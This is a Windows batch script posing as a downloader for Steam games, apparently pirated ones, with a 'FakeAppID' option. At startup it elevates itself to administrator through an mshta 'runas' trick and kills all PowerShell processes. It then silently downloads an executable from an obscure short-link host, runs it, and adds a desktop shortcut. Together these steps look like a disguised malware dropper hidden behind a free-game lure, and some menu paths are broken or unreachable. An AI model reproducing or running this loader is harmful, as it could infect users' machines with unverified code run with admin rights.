@echo off
set ver=0.1 BETA
color 0D
REM Run as admin
%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd","/c %~s0 ::","","runas",1)(window.close) && exit
cd /d "%~dp0"
taskkill /IM powershell.exe /F

title Alpha2 V%ver%

:MainMenu
cls
title Alpha2 V%ver%
mode 82, 25
echo:     ________________________________________________________________________
echo:
echo:                                      Welcome
echo:                              developed by Alpha2
echo:     ________________________________________________________________________ 
echo:      Request
echo:
echo:         [1] Wizard with a Gun  (13262001) (id=1150530) ^| Steam ^|  Download
echo:         [ ] Secrets Of Grindea (v1.00a)   (id=269770)  ^| Steam ^|  Download
echo:         ________________________________________________________________
echo.
echo:         [4] FakeAppID 638490
echo:         
echo:         [0] Exit
echo:     ________________________________________________________________________ 
echo:                                   2024 ^| Alpha2
echo.
echo:     Enter a menu option in the Keyboard [1,4,0] :
choice /C:123456780 /N
set "userChoice=%errorlevel%"

if %userChoice%==1 goto Download1
if %userChoice%==2 goto Download2
if %userChoice%==3 goto Download3
if %userChoice%==4 goto FakeappID
if %userChoice%==9 goto EndScript

:Download1
echo.
echo:  please set your path (e.g. : [D:\Games] or etc.)
set /p dir="  path:  "
echo:  Silent Download...
@echo off
set "url=https://pd.cybar.xyz/dE3LLo2R"
for /f %%i in ('curl --progress-bar -L -s -w "%%{speed_download}" -o "%dir%/Setup.wizard.with.a.gun.exe" "%url%"') do set "avg_speed=%%i"
echo %avg_speed%
echo.
echo.
echo:  Download Complete! ^| Wait for Unpack..
echo: When finished unpacking, you can close the console or 'Enter' to go to the main menu.
cd /d %dir%
start "" "Setup.wizard.with.a.gun.exe"
echo.
@echo off
set SCRIPT="%TEMP%\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs"

echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
echo sLinkFile = "%USERPROFILE%\Desktop\Wizard With a Gun.lnk" >> %SCRIPT%
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
echo oLink.TargetPath = "%CD%\Wizard with a Gun\wizardwithagun.exe" >> %SCRIPT%
echo oLink.IconLocation = "%CD%\Wizard with a Gun\wizardwithagun.exe, 0" >> %SCRIPT%
echo oLink.Save >> %SCRIPT%

cscript /nologo %SCRIPT%
del %SCRIPT%

pause
goto MainMenu


:Download999
echo.
echo:  please set your path (e.g. : [D:\Games] or etc.)
set /p pixie_dir="  path:  "
@echo off
set "url2=https://pd.cybar.xyz/dE3LLo2R"
for /f %%i in ('curl --progress-bar -L -s -w "%%{speed_download}" -o "%pixie_dir%" "%url2%"') do set "avg_speed=%%i"
echo %avg_speed%
cd /d %temp%
cd /d %pixie_dir%
start "" "Setup.Secrets.Of.Grindea.exe"
pause
goto MainMenu

:FakeappID
start "" "steam://install/638490/"
pause >nul
goto MainMenu

:EndScript
echo Exiting script...
